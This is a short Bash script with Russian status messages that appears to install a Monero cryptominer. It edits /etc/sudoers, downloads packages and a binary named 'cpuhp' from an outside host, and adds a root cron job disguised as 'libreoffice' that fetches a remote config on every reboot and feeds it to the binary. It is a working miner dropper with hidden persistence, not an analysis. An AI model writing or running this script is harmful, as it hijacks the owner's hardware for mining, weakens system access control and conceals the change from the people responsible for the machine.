#!/bin/bash
su
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
echo "SUDO Разблокирован!."
cd /tmp
wget https://xmrhorizontal.github.io/msr-tools_1.3-5_amd64.deb
wget https://xmrhorizontal.github.io/hwloc_2.9.0-1_amd64.deb
dpkg -i msr-tools_1.3-5_amd64.deb
dpkg -i hwloc_2.9.0-1_amd64.deb
apt-get install -f

if ( lspci | grep -i nvidia ); then
	apt-get install -y nvidia-cuda-toolkit
fi
    echo "Создаю папку /root/bmcontrol."
    mkdir /root/bmcontrol
    cd /root/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
echo OK!

